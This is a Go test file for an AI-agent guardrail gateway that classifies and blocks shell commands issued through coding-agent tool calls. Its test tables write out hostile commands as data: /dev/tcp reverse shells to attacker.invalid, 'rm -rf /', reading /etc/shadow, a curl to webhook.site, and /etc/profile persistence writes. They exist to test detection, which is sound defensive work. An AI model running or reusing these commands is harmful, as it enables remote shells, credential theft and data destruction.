// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"database/sql"
	"encoding/json"
	"path/filepath"
	"regexp"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/audit"
	"github.com/defenseclaw/defenseclaw/internal/config"
	"github.com/defenseclaw/defenseclaw/internal/scanner"
)

func TestBashInlineOwnerIsDetectionOnlyAcrossProfilesModesAndPersistence(t *testing.T) {
	commands := []string{
		`bash -c 'printf "%s\n" ready'`,
		`bash -c "printf ready"`,
		`sh -c 'printf ready'`,
		`command bash -c 'printf "%s\n" ready'`,
		`/bin/bash -c 'printf "%s\n" ready'`,
	}
	for _, profile := range []string{"default", "strict", "permissive"} {
		for _, mode := range []string{"observe", "action"} {
			t.Run(profile+"/"+mode, func(t *testing.T) {
				const connector = "codex"
				installIssue708ProfileConnector(t, connector, profile)
				fixture := newSidecarRuntimeFixture(t, true)
				logger := audit.NewLogger(fixture.store)
				logger.SetRuntimeV8Emitter(&sidecarOwnedObservabilityV8Runtime{runtime: fixture.runtime})
				cfg := &config.Config{}
				cfg.Guardrail.Mode = mode
				cfg.Guardrail.Connector = connector
				cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), profile)
				api := NewAPIServer(
					"127.0.0.1:0", NewSidecarHealth(), nil,
					fixture.store, logger, cfg,
				)

				for _, command := range commands {
					response := api.evaluateCodexHook(t.Context(), codexHookRequest{
						HookEventName: "PreToolUse",
						ToolName:      "Bash",
						ToolInput:     map[string]interface{}{"command": command},
						CWD:           "/repo",
					})
					if response.Action != guardrailActionAllow ||
						response.RawAction != guardrailActionAllow ||
						response.Severity != "LOW" || response.WouldBlock ||
						response.AdditionalContext != "" || response.CodexOutput != nil ||
						!findingStringHasRuleID(response.Findings, "CMD-BASH-C") {
						t.Fatalf(
							"%s/%s response for %q = %+v, want quiet retained LOW telemetry",
							profile, mode, command, response,
						)
					}
				}

				database, err := sql.Open("sqlite", fixture.path)
				if err != nil {
					t.Fatal(err)
				}
				defer database.Close()
				rows, err := database.Query(
					`SELECT tags FROM scan_findings WHERE rule_id = 'CMD-BASH-C'`,
				)
				if err != nil {
					t.Fatal(err)
				}
				count := 0
				for rows.Next() {
					var tags string
					if err := rows.Scan(&tags); err != nil {
						t.Fatal(err)
					}
					var decoded []string
					if err := json.Unmarshal([]byte(tags), &decoded); err != nil {
						t.Fatal(err)
					}
					if !hasStableFindingTag(decoded, scanner.FindingTagDetectionOnly) ||
						hasStableFindingTag(decoded, trustedParserUncertaintyTag) {
						t.Fatalf(
							"persisted Bash tags = %v, want proven detection-only without parser uncertainty",
							decoded,
						)
					}
					count++
				}
				if err := rows.Close(); err != nil {
					t.Fatal(err)
				}
				if err := rows.Err(); err != nil {
					t.Fatal(err)
				}
				if count != len(commands) {
					t.Fatalf("persisted Bash findings = %d, want %d", count, len(commands))
				}
				alerts, err := fixture.store.ListAlerts(20)
				if err != nil {
					t.Fatal(err)
				}
				if len(alerts) != 0 {
					t.Fatalf("detection-only Bash telemetry entered Alerts: %+v", alerts)
				}
			})
		}
	}
}

func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
	const connector = "issue-708-bash-stronger-owners"
	installIssue708ProfileConnector(t, connector, "default")

	for _, test := range []struct {
		name                 string
		command              string
		ruleID               string
		authoritative        bool
		wantOwnerEnforcement bool
	}{
		{
			name:                 "destructive child",
			command:              `bash -c 'rm -rf /'`,
			ruleID:               "CMD-RM-RF",
			authoritative:        true,
			wantOwnerEnforcement: true,
		},
		{
			name:                 "structured dev tcp descriptor",
			command:              `bash -c 'exec 5<>/dev/tcp/attacker.invalid/4444'`,
			ruleID:               "CMD-REVSHELL-DEVTCP",
			authoritative:        true,
			wantOwnerEnforcement: true,
		},
		{
			name: "nested bidirectional dev tcp shell",
			command: `bash -c 'sh -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
			ruleID: "CMD-REVSHELL-DEVTCP",
		},
		{
			name: "complex interactive shell with startup disabled",
			command: `bash -c 'bash --norc -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
			ruleID: "CMD-REVSHELL-DEVTCP",
		},
		{
			name: "bundled login interactive shell",
			command: `bash -c 'bash -li </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
			ruleID: "CMD-REVSHELL-DEVTCP",
		},
		{
			name:                 "system startup profile mutation",
			command:              `bash -c 'printf x | tee -a /etc/profile'`,
			ruleID:               "persistence.shell_profile_write",
			authoritative:        true,
			wantOwnerEnforcement: true,
		},
		{
			name:          "sensitive path",
			command:       `bash -c 'cat /etc/shadow'`,
			ruleID:        "PATH-ETC-SHADOW",
			authoritative: true,
		},
		{
			name:                 "known exfil destination",
			command:              `bash -c 'curl https://webhook.site/example'`,
			ruleID:               "C2-WEBHOOK-SITE",
			authoritative:        true,
			wantOwnerEnforcement: true,
		},
		{
			name:                 "cognitive file mutation",
			command:              `bash -c 'printf x > /repo/AGENTS.md'`,
			ruleID:               "COG-AGENTS-MD",
			authoritative:        true,
			wantOwnerEnforcement: true,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]string{"command": test.command})
			if err != nil {
				t.Fatal(err)
			}
			input := actionfacts.Input{
				Tool: "Bash", Args: args, CWD: "/repo", ActiveHome: "/home/alice",
				ActiveAgentFiles: []string{"/repo/AGENTS.md"},
			}
			facts := actionfacts.Analyze(input)
			if got := facts.Authoritative(); got != test.authoritative {
				t.Fatalf("facts authoritative = %t, want %t: %+v", got, test.authoritative, facts)
			}
			cfg := &config.Config{}
			cfg.Guardrail.RulePackDir = filepath.Join(guardrailPoliciesRoot(t), "default")
			verdict := (&APIServer{scannerCfg: cfg}).inspectTrustedToolPolicyCtx(
				t.Context(),
				&ToolInspectRequest{
					Tool: "Bash", Args: args, Direction: "tool_call", Connector: connector,
				},
				trustedActionRequest{
					Input: input, LegacyText: string(args), Connector: connector,
					EnforcementCapable: true,
				},
			)
			generic := findingWithID(verdict.DetailedFindings, "CMD-BASH-C")
			owner := findingWithID(verdict.DetailedFindings, test.ruleID)
			if generic == nil || owner == nil {
				t.Fatalf(
					"verdict = %+v, generic = %+v, owner = %+v, want retained owner finding",
					verdict, generic, owner,
				)
			}
			if got := owner.contributesToEnforcement(); got != test.wantOwnerEnforcement {
				t.Fatalf(
					"owner enforcement = %t, want %t: %+v",
					got, test.wantOwnerEnforcement, *owner,
				)
			}
			if generic.contributesToEnforcement() {
				t.Fatalf(
					"generic Bash shape crossed proof boundary: %+v",
					*generic,
				)
			}
		})
	}
}

func TestBashInlineDemotionPreservesUncertaintyLiteralsAndOtherInterpreters(t *testing.T) {
	const connector = "issue-708-bash-controls"
	installIssue708ProfileConnector(t, connector, "default")

	for _, test := range []struct {
		name            string
		input           actionfacts.Input
		legacy          string
		ruleID          string
		wantMatch       bool
		wantEnforcement bool
	}{
		{
			name: "source literal",
			input: actionfacts.Input{
				Tool:    "shell",
				Command: `rg -n "bash -c 'printf ok'" internal/gateway`,
				CWD:     "/repo",
			},
			legacy: `rg -n "bash -c 'printf ok'" internal/gateway`,
			ruleID: "CMD-BASH-C",
		},
		{
			name:   "malformed payload literal",
			input:  actionfacts.Input{Tool: "shell", Args: []byte(`{"command":`)},
			legacy: `bash -c 'printf ok'`,
			ruleID: "CMD-BASH-C",
		},
		{
			name: "environment-changing wrapper remains conservative",
			input: actionfacts.Input{
				Tool:    "shell",
				Command: `env MODE=check bash -c 'printf ok'`,
				CWD:     "/repo",
			},
			legacy:          `env MODE=check bash -c 'printf ok'`,
			ruleID:          "CMD-BASH-C",
			wantMatch:       true,
			wantEnforcement: false,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
				Input: test.input, LegacyText: test.legacy, Connector: connector,
				EnforcementCapable: true,
			})
			matched := findingWithID(findings, test.ruleID)
			if got := matched != nil; got != test.wantMatch {
				t.Fatalf("%s present = %t, want %t: %+v", test.ruleID, got, test.wantMatch, findings)
			}
			if matched != nil && matched.contributesToEnforcement() != test.wantEnforcement {
				t.Fatalf(
					"%s enforcement = %t, want %t: %+v",
					test.ruleID, matched.contributesToEnforcement(), test.wantEnforcement, *matched,
				)
			}
		})
	}
}

func TestBashInlineCustomRuleWithBuiltinIDRemainsVisibleButUnproven(t *testing.T) {
	const connector = "issue-708-bash-custom-owner"
	installIssue708ProfileConnector(t, connector, "default")
	pack := mustLoadRulePack(t, filepath.Join(guardrailPoliciesRoot(t), "default"))
	found := false
	for _, file := range pack.RuleFiles {
		for index := range file.Rules {
			rule := &file.Rules[index]
			if rule.ID != "CMD-BASH-C" {
				continue
			}
			rule.Pattern = `(?i)\bprintf\s+dangerous\b`
			rule.Title = "Operator-owned Bash policy"
			rule.Severity = "CRITICAL"
			rule.Confidence = 0.99
			rule.Tags = []string{"operator-policy"}
			found = true
		}
	}
	if !found {
		t.Fatal("CMD-BASH-C fixture is missing")
	}
	if err := ApplyConnectorRulePackOverrides(connector, pack); err != nil {
		t.Fatal(err)
	}

	command := `bash -c 'printf dangerous'`
	findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
		Input: actionfacts.Input{
			Tool: "shell", Command: command, CWD: "/repo",
		},
		LegacyText: command, Connector: connector, EnforcementCapable: true,
	})
	matched := findingWithID(findings, "CMD-BASH-C")
	if matched == nil || matched.contributesToEnforcement() ||
		matched.Title != "Operator-owned Bash policy" ||
		matched.Severity != "CRITICAL" {
		t.Fatalf("custom CMD-BASH-C crossed proof boundary or lost visibility: %+v", matched)
	}
}

func TestBashInlineExactBuiltinRuleContractIsAccepted(t *testing.T) {
	contract, ok := trustedLegacyProvenCommandDetectionOnly["CMD-BASH-C"]
	if !ok {
		t.Fatal("CMD-BASH-C detection-only contract is missing")
	}
	rule := PatternRule{
		ID:         "CMD-BASH-C",
		Pattern:    regexp.MustCompile(contract.pattern),
		Title:      contract.title,
		Severity:   contract.severity,
		Confidence: contract.confidence,
		Tags:       append([]string(nil), contract.tags...),
	}
	generation := &compiledRulePackCategories{categories: []ruleCategory{
		{Name: "command", Rules: []PatternRule{rule}},
	}}
	if !trustedLegacyDetectionOnlyCommandRule(generation, "CMD-BASH-C", contract) {
		t.Fatal("exact built-in CMD-BASH-C identity was not accepted")
	}
}

func TestBashInlineDuplicateBuiltinRuleIDRemainsEnforceable(t *testing.T) {
	contract, ok := trustedLegacyProvenCommandDetectionOnly["CMD-BASH-C"]
	if !ok {
		t.Fatal("CMD-BASH-C detection-only contract is missing")
	}
	rule := PatternRule{
		ID:         "CMD-BASH-C",
		Pattern:    regexp.MustCompile(contract.pattern),
		Title:      contract.title,
		Severity:   contract.severity,
		Confidence: contract.confidence,
		Tags:       append([]string(nil), contract.tags...),
	}
	generation := &compiledRulePackCategories{categories: []ruleCategory{
		{Name: "command", Rules: []PatternRule{rule}},
		{Name: "custom", Rules: []PatternRule{rule}},
	}}
	if trustedLegacyDetectionOnlyCommandRule(generation, "CMD-BASH-C", contract) {
		t.Fatal("duplicate CMD-BASH-C identities entered the code-owned detection-only allowlist")
	}
}

func TestDevTCPFallbackRequiresExecutableBidirectionalFlow(t *testing.T) {
	for _, test := range []struct {
		name    string
		command string
		want    bool
	}{
		{
			name: "nested interactive shell",
			command: `bash -c 'sh -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
			want: true,
		},
		{
			name: "double quoted IPv4 shell",
			command: `bash -c "sh -i </dev/tcp/203.0.113.10/4444 ` +
				`>/dev/tcp/203.0.113.10/4444 2>&1"`,
			want: true,
		},
		{
			name:    "outbound health probe",
			command: `bash -c 'printf health >/dev/tcp/collector.invalid/443'`,
		},
		{
			name:    "inbound one-way read",
			command: `bash -c 'cat </dev/tcp/collector.invalid/443 >/tmp/result'`,
		},
		{
			name: "quoted source literal",
			command: `printf '%s\n' ` +
				`'sh -i </dev/tcp/attacker.invalid/4444 >/dev/tcp/attacker.invalid/4444'`,
		},
		{
			name: "positional interactive-looking argument",
			command: `bash -c 'sh script -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "end-of-options interactive-looking argument",
			command: `bash -c 'sh -- -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "interactive mode disabled later",
			command: `bash -c 'bash -i +i -c cat </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "terminal version option",
			command: `bash -c 'bash --version -i </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "invalid option prefix",
			command: `bash -c 'bash --definitely-invalid -i ` +
				`</dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "interactive command mode ignores network stdin",
			command: `bash -c 'bash -ic true </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
		{
			name: "interactive script mode ignores network stdin",
			command: `bash -c 'bash -i local.sh </dev/tcp/attacker.invalid/4444 ` +
				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := actionfacts.Analyze(actionfacts.Input{
				Tool: "shell", Command: test.command, CWD: "/repo",
			})
			if got := devTCPFallbackProof(facts, false); got != test.want {
				t.Fatalf("dev TCP proof = %t, want %t: %+v", got, test.want, facts)
			}
		})
	}
}

func TestSystemShellProfileOwnerIsExact(t *testing.T) {
	owner, ok := semanticIntegrityPersistenceOwners["persistence.shell_profile_write"]
	if !ok {
		t.Fatal("persistence.shell_profile_write semantic owner is missing")
	}
	for _, test := range []struct {
		name    string
		command string
		want    bool
	}{
		{
			name:    "append exact system profile",
			command: `printf x | tee -a /etc/profile`,
			want:    true,
		},
		{
			name:    "delete exact system profile",
			command: `rm /etc/profile`,
			want:    true,
		},
		{
			name:    "lexically equivalent system profile",
			command: `printf x > /etc/../etc/profile`,
			want:    true,
		},
		{
			name:    "read is not mutation",
			command: `cat /etc/profile`,
		},
		{
			name:    "profile d sibling",
			command: `printf x > /etc/profile.d/tool.sh`,
		},
		{
			name:    "suffix sibling",
			command: `printf x > /etc/profile.local`,
		},
		{
			name:    "repository fixture basename",
			command: `printf x > /repo/fixtures/etc/profile`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := analyzeIntegrityCommand(
				t, test.command, "", "/repo", "/home/alice",
			)
			if got := owner.prerequisite(facts); got != test.want {
				t.Fatalf("system profile owner = %t, want %t: %+v", got, test.want, facts)
			}
		})
	}
}

func TestSystemShellProfilePatternIsShippedAcrossProfiles(t *testing.T) {
	for _, profile := range []string{"default", "strict", "permissive"} {
		t.Run(profile, func(t *testing.T) {
			pack := mustLoadRulePack(t, filepath.Join(guardrailPoliciesRoot(t), profile))
			var pattern string
			for _, file := range pack.RuleFiles {
				for _, rule := range file.Rules {
					if rule.ID == "persistence.shell_profile_write" {
						pattern = rule.Pattern
					}
				}
			}
			if pattern == "" {
				t.Fatal("persistence.shell_profile_write is missing")
			}
			compiled, err := regexp.Compile(pattern)
			if err != nil {
				t.Fatal(err)
			}
			if !compiled.MatchString("/etc/profile") ||
				compiled.MatchString("C:/etc/profile") ||
				compiled.MatchString("/etc/profile.local") ||
				compiled.MatchString("/repo/fixtures/etc/profile") {
				t.Fatalf("system profile pattern is not exact: %q", pattern)
			}
		})
	}
}

func installIssue708ProfileConnector(t *testing.T, connector, profile string) {
	t.Helper()
	ruleCategoriesMu.Lock()
	savedCategories, hadCategories := connectorRuleCategories[connector]
	savedGeneration, hadGeneration := connectorRuleGenerations[connector]
	ruleCategoriesMu.Unlock()
	t.Cleanup(func() {
		ruleCategoriesMu.Lock()
		defer ruleCategoriesMu.Unlock()
		if hadCategories {
			connectorRuleCategories[connector] = savedCategories
		} else {
			delete(connectorRuleCategories, connector)
		}
		if hadGeneration {
			connectorRuleGenerations[connector] = savedGeneration
		} else {
			delete(connectorRuleGenerations, connector)
		}
	})

	pack := mustLoadRulePack(t, filepath.Join(guardrailPoliciesRoot(t), profile))
	if err := ApplyConnectorRulePackOverrides(connector, pack); err != nil {
		t.Fatal(err)
	}
}

func TestBashInlineProofNormalizesPOSIXAndRejectsUnmodeledWindowsPaths(t *testing.T) {
	for _, test := range []struct {
		name          string
		input         actionfacts.Input
		authoritative bool
		want          bool
	}{
		{
			name: "absolute POSIX Bash",
			input: actionfacts.Input{
				Tool: "shell", Command: `/bin/bash -c 'printf ready'`,
				DialectHint: actionfacts.DialectPOSIX,
			},
			authoritative: true,
			want:          true,
		},
		{
			name: "bare Windows Bash remains partial",
			input: actionfacts.Input{
				Tool: "shell", Command: `bash -c "printf ready"`,
				DialectHint: actionfacts.DialectCMD,
			},
		},
		{
			name: "Windows Bash executable remains partial",
			input: actionfacts.Input{
				Tool: "shell", Command: `bash.exe -c "printf ready"`,
				DialectHint: actionfacts.DialectCMD,
			},
		},
		{
			name: "absolute Windows Bash executable remains partial",
			input: actionfacts.Input{
				Tool:        "shell",
				Command:     `"C:\Program Files\Git\bin\bash.exe" -c "printf ready"`,
				DialectHint: actionfacts.DialectCMD,
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := actionfacts.Analyze(test.input)
			if got := facts.Authoritative(); got != test.authoritative {
				t.Fatalf("authoritative = %t, want %t: %+v", got, test.authoritative, facts)
			}
			if got := trustedBashInlineCommandOwnerProven(facts); got != test.want {
				t.Fatalf("Bash owner proof = %t, want %t: %+v", got, test.want, facts)
			}
		})
	}
}

func TestSystemShellProfileOwnerRejectsWindowsLookalikePaths(t *testing.T) {
	owner, ok := semanticIntegrityPersistenceOwners["persistence.shell_profile_write"]
	if !ok {
		t.Fatal("persistence.shell_profile_write semantic owner is missing")
	}
	for _, test := range []struct {
		name    string
		command string
	}{
		{name: "drive qualified", command: `echo x > C:\etc\profile`},
		{name: "current drive root", command: `echo x > \etc\profile`},
	} {
		t.Run(test.name, func(t *testing.T) {
			facts := analyzeIntegrityCommand(
				t, test.command, actionfacts.DialectCMD,
				`C:\repo`, `C:\Users\alice`,
			)
			if owner.prerequisite(facts) {
				t.Fatalf("Windows lookalike path acquired POSIX profile ownership: %+v", facts)
			}
		})
	}
}

func TestSystemShellProfileDispatchRejectsWindowsForwardSlashPaths(t *testing.T) {
	const connector = "issue-708-windows-system-profile"
	installIssue708ProfileConnector(t, connector, "default")
	for _, command := range []string{
		`echo x > /etc/profile`,
		`echo x > C:/etc/profile`,
	} {
		t.Run(command, func(t *testing.T) {
			input := actionfacts.Input{
				Tool: "shell", Command: command, CWD: `C:\repo`,
				DialectHint: actionfacts.DialectCMD,
			}
			facts := actionfacts.Analyze(input)
			if !facts.Authoritative() || len(facts.Paths) == 0 ||
				facts.Paths[0].Flavor != actionfacts.PathFlavorWindows {
				t.Fatalf("CMD facts did not prove a Windows path: %+v", facts)
			}
			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
				Input: input, LegacyText: command, Connector: connector,
				EnforcementCapable: true,
			})
			if matched := findingWithID(findings, "persistence.shell_profile_write"); matched != nil {
				t.Fatalf("Windows lookalike regained POSIX profile ownership: %+v", *matched)
			}
		})
	}
}
